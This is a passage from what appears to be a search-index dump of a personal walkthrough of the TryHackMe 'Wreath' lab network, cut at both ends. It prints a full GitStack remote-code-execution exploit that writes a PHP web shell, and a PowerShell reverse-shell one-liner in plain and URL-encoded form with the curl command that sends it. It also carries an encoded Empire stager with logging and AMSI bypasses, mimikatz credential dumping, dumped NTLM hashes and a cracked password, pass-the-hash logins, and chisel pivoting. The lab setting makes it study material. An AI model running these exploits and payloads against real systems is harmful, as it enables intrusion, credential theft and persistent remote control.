(uid:rid:lmhash:nthash)\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:a05c3c807ceeb48c47252568da284cd2:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nDefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nWDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:06e57bdd6824566d79f127fa0de844e2:::\nThomas:1000:aad3b435b51404eeaad3b435b51404ee:02d90eda8f6b6b06c32d5f207831101f:::\n</code></pre> <p>Admin hash `Administrator:a05c3c807ceeb48c47252568da284cd2</p>"},{"location":"Wreath/10.200.109.150/01-nmap/","title":"01 nmap","text":"<pre><code>-bash-4.4# ./nmap_sp00f -v 10.200.109.150 -oN sp00f_scan_150\n\nStarting Nmap 6.49BETA1 ( http://nmap.org ) at 2021-04-10 06:40 BST\nUnable to find nmap-services!  Resorting to /etc/services\nCannot find nmap-payloads. UDP payloads are disabled.\nInitiating ARP Ping Scan at 06:40\nScanning 10.200.109.150 [1 port]\nCompleted ARP Ping Scan at 06:40, 0.20s elapsed (1 total hosts)\nInitiating Parallel DNS resolution of 1 host. at 06:40\nCompleted Parallel DNS resolution of 1 host. at 06:40, 0.00s elapsed\nInitiating SYN Stealth Scan at 06:40\nScanning ip-10-200-109-150.eu-west-1.compute.internal (10.200.109.150) [6150 ports]\nDiscovered open port 80/tcp on 10.200.109.150\nDiscovered open port 3389/tcp on 10.200.109.150\nDiscovered open port 5985/tcp on 10.200.109.150\nIncreasing send delay for 10.200.109.150 from 0 to 5 due to 17 out of 56 dropped probes since last increase.\nCompleted SYN Stealth Scan at 06:41, 67.99s elapsed (6150 total ports)\nNmap scan report for ip-10-200-109-150.eu-west-1.compute.internal (10.200.109.150)\nCannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed\nHost is up (0.00037s latency).\nNot shown: 6147 filtered ports\nPORT     STATE SERVICE\n80/tcp   open  http\n3389/tcp open  ms-wbt-server\n5985/tcp open  wsman\nMAC Address: 02:0B:6D:4B:ED:13 (Unknown)\n\nRead data files from: /etc\nNmap done: 1 IP address (1 host up) scanned in 68.24 seconds\n           Raw packets sent: 18499 (813.924KB) | Rcvd: 57 (2.492KB)\n-bash-4.4# \n</code></pre>"},{"location":"Wreath/10.200.109.150/02-Web%28port-80%29/","title":"02 Web(port 80)","text":"<p>http://10.200.109.150/gitstack/ redirects to http://10.200.109.150/registration/login/?next=/gitstack/</p> <p></p>"},{"location":"Wreath/10.200.109.150/03-Exploits/","title":"03 Exploits","text":""},{"location":"Wreath/10.200.109.150/03-Exploits/#searchsploit-results","title":"searchsploit results","text":"<pre><code>\u2514\u2500$ searchsploit gitstack \n----------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                     |  Path\n----------------------------------------------------------------------------------- ---------------------------------\nGitStack - Remote Code Execution                                                   | php/webapps/44044.md\nGitStack - Unsanitized Argument Remote Code Execution (Metasploit)                 | windows/remote/44356.rb\nGitStack 2.3.10 - Remote Code Execution                                            | php/webapps/43777.py\n----------------------------------------------------------------------------------- ---------------------------------\nShellcodes: No Results\n</code></pre> <p>43777.py</p> <pre><code>#!/usr/bin/python\n# Exploit: GitStack 2.3.10 Unauthenticated Remote Code Execution\n# Date: 18.01.2018\n# Software Link: https://gitstack.com/\n# Exploit Author: Kacper Szurek\n# Contact: https://twitter.com/KacperSzurek\n# Website: https://security.szurek.pl/\n# Category: remote\n#   \n#1. Description\n#  \n#$_SERVER['PHP_AUTH_PW'] is directly passed to exec function.\n#\n#https://security.szurek.pl/gitstack-2310-unauthenticated-rce.html\n# \n#2. Proof of Concept\n#\nimport requests\nfrom requests.auth import HTTPBasicAuth\nimport os\nimport sys\n\nip = '10.200.109.150'\n\n# What command you want to execute\ncommand = \"whoami\"\n\nrepository = 'rce'\nusername = 'rce'\npassword = 'rce'\ncsrf_token = 'token'\n\nuser_list = []\n\nprint \"[+] Get user list\"\ntry:\n    r = requests.get(\"http://{}/rest/user/\".format(ip))\n    user_list = r.json()\n    user_list.remove('everyone')\nexcept:\n    pass\n\nif len(user_list) &gt; 0:\n    username = user_list[0]\n    print \"[+] Found user {}\".format(username)\nelse:\n    r = requests.post(\"http://{}/rest/user/\".format(ip), data={'username' : username, 'password' : password})\n    print \"[+] Create user\"\n\n    if not \"User created\" in r.text and not \"User already exist\" in r.text:\n        print \"[-] Cannot create user\"\n        os._exit(0)\n\nr = requests.get(\"http://{}/rest/settings/general/webinterface/\".format(ip))\nif \"true\" in r.text:\n    print \"[+] Web repository already enabled\"\nelse:\n    print \"[+] Enable web repository\"\n    r = requests.put(\"http://{}/rest/settings/general/webinterface/\".format(ip), data='{\"enabled\" : \"true\"}')\n    if not \"Web interface successfully enabled\" in r.text:\n        print \"[-] Cannot enable web interface\"\n        os._exit(0)\n\nprint \"[+] Get repositories list\"\nr = requests.get(\"http://{}/rest/repository/\".format(ip))\nrepository_list = r.json()\n\nif len(repository_list) &gt; 0:\n    repository = repository_list[0]['name']\n    print \"[+] Found repository {}\".format(repository)\nelse:\n    print \"[+] Create repository\"\n\n    r = requests.post(\"http://{}/rest/repository/\".format(ip), cookies={'csrftoken' : csrf_token}, data={'name' : repository, 'csrfmiddlewaretoken' : csrf_token})\n    if not \"The repository has been successfully created\" in r.text and not \"Repository already exist\" in r.text:\n        print \"[-] Cannot create repository\"\n        os._exit(0)\n\nprint \"[+] Add user to repository\"\nr = requests.post(\"http://{}/rest/repository/{}/user/{}/\".format(ip, repository, username))\n\nif not \"added to\" in r.text and not \"has already\" in r.text:\n    print \"[-] Cannot add user to repository\"\n    os._exit(0) \n\nprint \"[+] Disable access for anyone\"\nr = requests.delete(\"http://{}/rest/repository/{}/user/{}/\".format(ip, repository, \"everyone\"))\n\nif not \"everyone removed from rce\" in r.text and not \"not in list\" in r.text:\n    print \"[-] Cannot remove access for anyone\"\n    os._exit(0) \n\nprint \"[+] Create backdoor in PHP\"\nr = requests.get('http://{}/web/index.php?p={}.git&amp;a=summary'.format(ip, repository), auth=HTTPBasicAuth(username, 'p &amp;&amp; echo \"&lt;?php system($_POST[\\'a\\']); ?&gt;\" &gt; c:\\GitStack\\gitphp\\exploit_sp00f.php'))\nprint r.text.encode(sys.stdout.encoding, errors='replace')\n\nprint \"[+] Execute command\"\nr = requests.post(\"http://{}/web/exploit_sp00f.php\".format(ip), data={'a' : command})\nprint r.text.encode(sys.stdout.encoding, errors='replace')\n\n</code></pre> <p></p> <p>Output of whoami command</p> <p>So changing the command will get us a reverse shell and its a <code>Windows Machine</code></p> <p>On studying the script, the command which is being executed can be overwritten by manually passing the the command and its stores in a variable <code>a</code></p> <pre><code>print \"[+] Execute command\"\nr = requests.post(\"http://{}/web/exploit_sp00f.php\".format(ip), data={'a' : command})\nprint r.text.encode(sys.stdout.encoding, errors='replace')\n</code></pre> <p>curl results </p> <pre><code>powershell.exe -c \"$client = New-Object System.Net.Sockets.TCPClient('10.200.109.200',20000);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"\n</code></pre> <p>url-encoded</p> <pre><code>powershell.exe%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%2710.200.109.200%27%2C20000%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22\n</code></pre> <p>Here we are not able to get a reverse shell but the command is executed.</p> <p><code>bash  \u2514\u2500$ curl http://10.200.109.150/web/exploit_sp00f.php -d \"a=powershell.exe%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%2710.200.109.200%27%2C20000%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22\"</code></p> <p>So this might be due to the firewall on the machines.</p> <p>Starting with centOS as we are pivitoing through CentOS only!</p> <p>from here https://stackoverflow.com/questions/24729024/open-firewall-port-on-centos-7 we can open ports </p> <p><code>firewall-cmd --zone=public --add-port=20000/tcp</code></p> <p>Here opening a port is not enough, we have to forward that port to us too.</p> <p>now after that send the payload and listen on rev shell on the prod server</p> <p></p> <p>got the reverse shell </p> <p>now here we are having a stable shell otherwise we can use socat for reverse shell forwarding </p>"},{"location":"Wreath/10.200.109.150/03-Exploits/#getting-reverse-shell-using-empire","title":"Getting Reverse shell using Empire","text":"<ul> <li> <p>1st shell     <code>uselistener http</code>     set the config and <code>execute</code>     I have set the name to GitServer     </p> </li> <li> <p>2nd shell     start a http_hop     <code>uselistener http_hop</code>     set the port of the website (prod server. from there we will the the shell)     </p> <p>set the Redirect Listener to the GitServer  and <code>execute</code> and it will create the files in /tmp/ folder, which we will host in the prod server and forward the shell to our main hacking machine</p> </li> <li> <p>3rd shell     <code>usestager multi/launcher</code> <code>set Listener http_hop</code> <code>execute</code>     here we are generating the powershell payload the get shell to the http_hop listener in the git-prod server      </p> <p></p> <p><code>powreshell powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBFAFIAUwBpAG8AbgBUAEEAYgBsAEUALgBQAFMAVgBFAFIAUwBpAE8AbgAuAE0AQQBKAG8AcgAgAC0AZwBlACAAMwApAHsAJABiAGUAMgBlADMAPQBbAFIAZQBmAF0ALgBBAHMAcwBFAE0AYgBsAFkALgBHAEUAVABUAHkAcABFACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBlAFQARgBJAGUAYABsAEQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkARgAoACQAYgBFADIARQAzACkAewAkADgARgBhADEAYgA9ACQAYgBFADIARQAzAC4ARwBlAFQAVgBBAGwAVQBFACgAJABuAHUATABsACkAOwBJAGYAKAAkADgAZgBBADEAQgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdACkAewAkADgAZgBBADEAYgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA4AGYAQQAxAEIAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0AJABWAGEATAA9AFsAQwBPAGwATABlAGMAVABJAG8AbgBTAC4ARwBFAE4AZQByAEkAYwAuAEQASQBDAFQASQBPAE4AYQByAFkAWwBTAHQAUgBJAG4AZwAsAFMAWQBTAFQAZQBtAC4ATwBiAEoAZQBDAHQAXQBdADoAOgBuAGUAdwAoACkAOwAkAHYAQQBMAC4AQQBkAEQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAFYAQQBMAC4AQQBkAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAOABGAGEAMQBiAFsAJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBcAFMAbwBmAHQAdwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUAcgBTAGgAZQBsAGwAXABTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAkAHYAYQBsAH0ARQBsAFMARQB7AFsAUwBjAFIASQBwAFQAQgBMAE8AYwBLAF0ALgAiAEcAZQB0AEYASQBlAGAATABkACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAdABWAGEATABVAEUAKAAkAE4AdQBMAEwALAAoAE4AZQB3AC0ATwBiAGoARQBjAHQAIABDAE8ATABMAGUAYwBUAGkAbwBuAFMALgBHAGUAbgBFAHIAaQBDAC4ASABhAHMAaABTAEUAdABbAHMAVABSAEkATgBnAF0AKQApAH0AJABSAEUARgA9AFsAUgBFAGYAXQAuAEEAUwBzAGUATQBiAGwAeQAuAEcARQB0AFQAeQBwAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpACcAKwAnAFUAdABpAGwAcwAnACkAOwAkAFIAZQBmAC4ARwBFAFQARgBpAGUATABEACgAJwBhAG0AcwBpAEkAbgBpAHQARgAnACsAJwBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAVABWAEEATABVAEUAKAAkAE4AVQBsAGwALAAkAFQAcgB1AEUAKQA7AH0AOwBbAFMAWQBzAFQARQBNAC4ATgBFAFQALgBTAEUAUgBWAEkAQwBFAFAATwBJAG4AVABNAGEAbgBhAGcARQByAF0AOgA6AEUAWABQAGUAQwB0ADEAMAAwAEMATwBuAHQASQBuAHUARQA9ADAAOwAkAEUANgBDAGMANQA9AE4AZQB3AC0ATwBiAGoARQBjAFQAIABTAHkAcwB0AEUAbQAuAE4ARQBUAC4AVwBFAEIAQwBsAGkARQBOAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABFADYAQwBDADUALgBIAGUAYQBEAGUAcgBTAC4AQQBkAEQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJABlADYAYwBjADUALgBQAFIATwBYAHkAPQBbAFMAWQBTAFQAZQBNAC4ATgBFAFQALgBXAEUAYgBSAGUAcQB1AGUAcwBUAF0AOgA6AEQAZQBGAGEAVQBMAHQAVwBlAGIAUABSAE8AWABZADsAJABlADYAYwBjADUALgBQAHIATwBYAFkALgBDAFIAZQBEAEUATgBUAEkAQQBMAFMAIAA9ACAAWwBTAFkAcwBUAEUATQAuAE4AZQBUAC4AQwBSAEUARABFAE4AVABJAEEATABDAEEAYwBoAEUAXQA6ADoARABlAGYAYQBVAEwAdABOAGUAVAB3AE8AcgBLAEMAUgBlAGQARQBuAHQAaQBBAGwAcwA7ACQASwA9AFsAUwBZAFMAdABFAE0ALgBUAGUAeAB0AC4ARQBuAGMATwBEAEkATgBnAF0AOgA6AEEAUwBDAEkASQAuAEcAZQB0AEIAWQBUAGUAcwAoACcAZwBiACwAfgAjAD4AMQBQAHUAZgApAFMATgBoADwAXgBFAHsAUQBVADQAMgB3AFYANwBaAHYAegBpAEQAWwArACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAFIARwBzADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBvAHUAbgB0AF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAEIAeABPAHIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQARQA2AGMAYwA1AC4ASABFAEEAZABFAFIAcwAuAEEARABkACgAIgBDAG8AbwBrAGkAZQAiACwAIgBzAGUAcwBzAGkAbwBuAD0ARwBYAHEARQBFADUAdgBoADMAbwBWAFYAcAB2AE4AUwBFAHgAdgBoAHYAegBkAGUAaABaAFUAPQAiACkAOwAkAHMAZQByAD0AJAAoAFsAVABFAFgAdAAuAEUAbgBDAE8ARABJAG4AZwBdADoAOgBVAG4AaQBDAE8AZABlAC4ARwBlAFQAUwBUAHIASQBuAEcAKABbAEMAbwBuAFYAZQBSAFQAXQA6ADoARgBSAG8ATQBCAEEAUwBFADYANABTAFQAUgBpAG4ARwAoACcAYQBBAEIAMABBAEgAUQBBAGMAQQBBADYAQQBDADgAQQBMAHcAQQB4AEEARABBAEEATABnAEEAeQBBAEQAQQBBAE0AQQBBAHUAQQBEAGcAQQBPAFEAQQB1AEEARABJAEEATQBBAEEAdwBBAEQAbwBBAE0AZwBBAHcAQQBEAEEAQQBNAEEAQQB3AEEAQQA9AD0AJwApACkAKQA7ACQAdAA9ACcALwBsAG8AZwBpAG4ALwBwAHIAbwBjAGUAcwBzAC4AcABoAHAAJwA7ACQAaABvAHAAPQAnAGgAdAB0AHAAXwBoAG8AcAAnADsAJABkAEEAdABBAD0AJABFADYAYwBjADUALgBEAG8AdwBuAGwATwBBAEQARABhAHQAYQAoACQAcwBFAFIAKwAkAHQAKQA7ACQASQBWAD0AJABkAGEAVABBAFsAMAAuAC4AMwBdADsAJABkAGEAdABBAD0AJABEAEEAVABBAFsANAAuAC4AJABEAGEAVABBAC4AbABlAE4AZwBUAEgAXQA7AC0ASgBPAGkATgBbAEMAaABBAFIAWwBdAF0AKAAmACAAJABSACAAJABkAGEAVABBACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA=</code></p> <p>Mini Road-Map</p> <pre><code>powershell payload using the stager(windows git server) -&gt; Prod-Server(http_hop) -&gt; Local HTTP Listener (NAME set my me: GitServer)\n</code></pre> </li> </ul> <p>and ssh into the prod server and host the files generated in the /tmp/ folder </p> <p>initially the files wont be called just a <code>Ctrl-C to quit.</code> </p> <p>and using the exploit of RCE in the windows git server we send the powershell payload with url-encoded it </p> <p>and finally after executing all correctly we the listener back on the local http listener </p> <pre><code>Here will still be needing to forward the port to execute the powershell code and open a port in the prod server\n</code></pre>"},{"location":"Wreath/10.200.109.150/04-Post_Exploitation/","title":"04 Post Exploitation","text":"<p>From the enumeration we did on this target we know that ports 3389 and 5985 are open. This means that (using an account with the correct privileges) we should be able to obtain either a GUI through RDP (port 3389) or a stable CLI shell using WinRM (port 5985).</p> <p>Adding new user and giving Admin privileges </p> <p>Using evil-winrm for stable shell and as post exploitation</p> <p><code>evil-winrm -u sp00f -p \"paSSword\" -i 10.200.109.150</code></p> <p></p> <p>using xfreerdp to get the hashes of the admin <code>xfreerdp /v:10.200.109.150 /u:sp00f /p:paSSword /drive:/usr/share/windows-resources,share</code></p> <p> </p> <p>Running the mimikatz binary to get escalate the privileges as we still cant get the hashes <code>\\\\tsclient\\share\\mimikatz\\x64\\mimikatz.exe</code></p> <p>Running <code>privilege::debug</code> <code>oken::elevate</code></p> <p>and <code>lsadump::sam</code> to get the dump </p> <pre><code>RID  : 000001f4 (500)                                                                                                   User : Administrator                                                                                                      Hash NTLM: 37db630168e5f82aafa8461e05c6bbd1      \n</code></pre> <pre><code>hash\n\nthmomas 02d90eda8f6b6b06c32d5f207831101f \npasswd: i&lt;3ruby\n</code></pre> <p></p>"},{"location":"Wreath/10.200.109.150/04-Post_Exploitation/#using-powershell","title":"Using Powershell","text":"<p>After getting the reverse shell back as the agents we will now use listeners</p> <p></p> <p>running Execute</p> <pre><code>Job started: C965SY\n\n\n\nTitle      : User Mode to Ring (KiTrap0D)\nMSBulletin : MS10-015\nCVEID      : 2010-0232\nLink       : https://www.exploit-db.com/exploits/11199/\nVulnStatus : Not supported on 64-bit systems\n\nTitle      : Task Scheduler .XML\nMSBulletin : MS10-092\nCVEID      : 2010-3338, 2010-3888\nLink       : https://www.exploit-db.com/exploits/19930/\nVulnStatus : Not Vulnerable\n\nTitle      : NTUserMessageCall Win32k Kernel Pool Overflow\nMSBulletin : MS13-053\nCVEID      : 2013-1300\nLink       : https://www.exploit-db.com/exploits/33213/\nVulnStatus : Not supported on 64-bit systems\n\nTitle      : TrackPopupMenuEx Win32k NULL Page\nMSBulletin : MS13-081\nCVEID      : 2013-3881\nLink       : https://www.exploit-db.com/exploits/31576/\nVulnStatus : Not supported on 64-bit systems\n\nTitle      : TrackPopupMenu Win32k Null Pointer Dereference\nMSBulletin : MS14-058\nCVEID      : 2014-4113\nLink       : https://www.exploit-db.com/exploits/35101/\nVulnStatus : Not Vulnerable\n\nTitle      : ClientCopyImage Win32k\nMSBulletin : MS15-051\nCVEID      : 2015-1701, 2015-2433\nLink       : https://www.exploit-db.com/exploits/37367/\nVulnStatus : Not Vulnerable\n\nTitle      : Font Driver Buffer Overflow\nMSBulletin : MS15-078\nCVEID      : 2015-2426, 2015-2433\nLink       : https://www.exploit-db.com/exploits/38222/\nVulnStatus : Not Vulnerable\n\nTitle      : 'mrxdav.sys' WebDAV\nMSBulletin : MS16-016\nCVEID      : 2016-0051\nLink       : https://www.exploit-db.com/exploits/40085/\nVulnStatus : Not supported on 64-bit systems\n\nTitle      : Secondary Logon Handle\nMSBulletin : MS16-032\nCVEID      : 2016-0099\nLink       : https://www.exploit-db.com/exploits/39719/\nVulnStatus : Not Vulnerable\n\nTitle      : Win32k Elevation of Privilege\nMSBulletin : MS16-135\nCVEID      : 2016-7255\nLink       : https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/Sample-Exploits/MS16-135\nVulnStatus : Not Vulnerable\n\nTitle      : Nessus Agent 6.6.2 - 6.10.3\nMSBulletin : N/A\nCVEID      : 2017-7199\nLink       : https://aspe1337.blogspot.co.uk/2017/04/writeup-of-cve-2017-7199.html\nVulnStatus : Not Vulnerable\n</code></pre> <p>Using Evil-WinRM, let look for the directory of source control</p> <p><code>GitStack_2.3.10.exe</code></p> <p></p> <p>git source control is in <code>C:\\GitStack\\repositories\\Website.git</code> </p> <p>downloading using <code>download Website.git</code></p>"},{"location":"Wreath/10.200.109.150/05-Pivoting/","title":"05 Pivoting","text":"<p>Using Evil-winrm we can pass the scripts folder  and call a particular script afterwards</p> <p><code>evil-winrm -u Administrator  -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.89.150 -s /usr/share/powershell-empire/data/module_source/situational_awareness/network/</code></p> <p>loading the script <code>Invoke-Portscan.ps1</code></p> <p>using the script <code>Invoke-Portscan -Hosts 10.200.89.100 -TopPorts 50</code></p> <p>output: <code>Hostname      : 10.200.89.100 alive         : True openPorts     : {80, 3389} closedPorts   : {} filteredPorts : {445, 443, 79, 88...} finishTime    : 4/30/2021 4:07:54 PM</code> </p> <p>opening the port in the git server using netsh</p> <p><code>netsh advfirewall firewall add rule name=\"Chisel-sp00f\" dir=in action=allow protocol=tcp localport=20000</code></p> <p>upload the chisel binary and run it from the port opened above  <code>upload /home/sp00f/THM/Wreath/10.200.109.100/www/chisel-sp00f.exe</code> <code>.\\chisel-sp00f.exe server -p 20000 --socks5</code> </p> <p>listen on the port locally <code>chisel client 10.200.89.150:20000 7070:socks</code> </p>"},{"location":"Wreath/10.200.109.200/01-nmap/","title":"01 nmap","text":"<pre><code>\u2514\u2500$ nmap -sC -sV -A -oN nmap 10.200.109.200                                                                          \nStarting Nmap 7.91 ( https://nmap.org ) at 2021-04-09 14:16 IST\nNmap scan report for 10.200.109.200\nHost is up (0.15s latency).\nNot shown: 994 filtered ports\nPORT      STATE  SERVICE    VERSION\n22/tcp    open   ssh        OpenSSH 8.0 (protocol 2.0)\n| ssh-hostkey: \n|   3072 9c:1b:d4:b4:05:4d:88:99:ce:09:1f:c1:15:6a:d4:7e (RSA)\n|   256 93:55:b4:d9:8b:70:ae:8e:95:0d:c2:b6:d2:03:89:a4 (ECDSA)\n|_  256 f0:61:5a:55:34:9b:b7:b8:3a:46:ca:7d:9f:dc:fa:12 (ED25519)\n80/tcp    open   http       Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)\n|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c\n|_http-title: Did not follow redirect to https://thomaswreath.thm\n443/tcp   open   ssl/http   Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)\n| http-methods: \n|_  Potentially risky methods: TRACE\n|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c\n|_http-title: Thomas Wreath | Developer\n| ssl-cert: Subject: commonName=thomaswreath.thm/organizationName=Thomas Wreath Development/stateOrProvinceName=East Riding Yorkshire/countryName=GB\n| Not valid before: 2021-04-09T06:35:17\n|_Not valid after:  2022-04-09T06:35:17\n|_ssl-date: TLS randomness does not represent time\n| tls-alpn: \n|_  http/1.1\n8000/tcp  closed http-alt\n9090/tcp  closed zeus-admin\n10000/tcp open   ssl/http   MiniServ 1.890 (Webmin httpd)\n|_http-server-header: MiniServ/1.890\n|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).\n|_http-trane-info: Problem with XML parsing of /evox/about\n| ssl-cert: Subject: commonName=*/organizationName=Webmin Webserver on prod-serv\n| Not valid before: 2020-11-07T22:27:10\n|_Not valid after:  2025-11-06T22:27:10\n|_ssl-date: TLS randomness does not represent time\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 69.83 seconds\n</code></pre>"},{"location":"Wreath/10.200.109.200/02-Web%28port-80%29/","title":"02 Web(port 80)","text":"<p>Domain : https://thomaswreath.thm/</p> <p></p>"},{"location":"Wreath/10.200.109.200/03-Exploits/","title":"03 Exploits","text":"<p>MiniServ 1.890 (Webmin httpd) - CVE-2019-15107</p> <p>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-15107</p> <p>https://nvd.nist.gov/vuln/detail/CVE-2019-15107</p> <p>The parameter old in password_change.cgi contains a command injection vulnerability.</p> <p>exploit: https://github.com/jas502n/CVE-2019-15107</p> <p>used: https://github.com/MuirlandOracle/CVE-2019-15107</p> <p>pseudo shell </p> <p>full shell as root </p>"},{"location":"Wreath/10.200.109.200/04-Post_Exploitation/","title":"04 Post Exploitation","text":"<p>hashes</p> <pre><code>sh-4.4# cat /etc/shadow\ncat 